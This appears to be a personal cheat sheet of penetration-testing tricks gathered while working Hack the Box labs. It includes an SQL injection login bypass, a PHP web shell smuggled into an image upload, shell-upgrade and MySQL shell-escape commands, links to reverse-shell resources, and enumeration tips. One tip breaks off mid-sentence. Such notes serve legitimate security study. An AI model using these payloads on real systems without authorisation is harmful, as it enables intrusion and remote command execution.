# tricks-htb
Tricks learned while working on the Hack the Box lab.

### Create Python http server to serve files
```bash
python -m SimpleHTTPServer
python3 -m http.server
```

### Bypass login
(magic) Try SQL injection in the login form. Pass this as user and password: `' or 1 = 1--`

### Enumeration
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### PHP reverse shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

### Spawn bash shell using Python
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
The press ctrl + z

Then run: `stty raw -echo`

Then write `fg` and press enter (note there's no output of `fg`)

### Reverse shell cheatsheet
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Dump traffic on an interface to console
This is useful when blind-exploiting a system, among other situations. Just dump the traffic of an interface to console:
```
tcpdump -i tun0 
```

### Exploit suggester for postexploitation on Metasploit
Use `post/multi/recon/local_exploit_suggester` after a non-admin meterpreter session is created in order to get suggestions on which exploits could be executed next.

### DNS
DNS servers are added to `/etc/resolv.conf`. It may be useful for when the server just accepts requests when host equals to _machineName.htb_. Otherwise the same could be achieved by adding an entry to the file `/etc/hosts`.

### SMB
Use smbmap to enumerate SMB. `smbmap -H $HOST_IP` 

### Redirects
If when intercepting the server responses with a proxy and the `302 Found` response has some content, the HTTP response number and code can be manually changed to, for example, `200 OK` to see the content on the browser instead of following the redirect.

### Abstract shit
- If there are so many things that look the same, check if there's one of them that's different. In general, this can be files sizes, files contents, etc.

### Shell from mysql
Run this from mysql to drop to a shell and see what user you are on:
`\! /bin/sh`

### Injecting php shell in image file
- Upload a proper image with the intercept on the proxy
- From the proxy, keep the following code as the "image"'s content: `{{imageMagicBytes}} <?php echo system($_REQUEST['whatever']); ?>`
- Also change the file name and append `.php` (if the image name is image.gif, it would be image.gif.php)
- Access the file from the browser and add `?whatever={{command}}`

Tip: The `file` command gets a file's type. It may be useful for checking if 

### Wordpress
Use `wpscan` to scan Wordpress sites.

### jar files
Jar files can be decompiled to get information from them. First, unzip it using `unzip`, then decompile the unzipped .class file using the program `jad`.

### Do several scans concurrently
Mainly for when there are several services running on the server, but it should be always done that way. After the initial nmap scan has finished, start several scans depending on the case. Eg if port 80 is open, trigger gobuster (with 2 lists, one short and one longer), nikto and maybe an nmap vuln scan.

### Check if port is open with nc
`nc -zv $HOST_IP $PORT`

### Scan all the ports with nmap
To scan all the ports with nmap add `-p-`.

### Threads number
For max speed while running scans don't forget to increase the number of threads.

### Also enumerate recursively
Recursive enumeration is important whenever we run out of options.

### exiftool to get files metadata
Use: `exiftool {{filename}}`
Note that browsers sometimes squash some metadata when downloading files, so download them using `wget` instead.

### Use book.hacktricks.xyz
Great resource, do check out when Duckduckgoing.

### Redis
When redis is available on the server, a common thing to try is to upload a file to gain access. https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

### Get strings from a binary
Use `strings {{filename}}` to get strings from binaries. This may help find passwords or other sensitive information.

### Multiple windows with `tmux` or `screen`

### Find files and directories you can write
`find . -writable`

### Redirect errors to /dev/null `2>/dev/null`
https://askubuntu.com/questions/350208/what-does-2-dev-null-mean

### Get information about files using `stat`
Use {{filename}}

### Identify hash type
Use `hash-identifier`
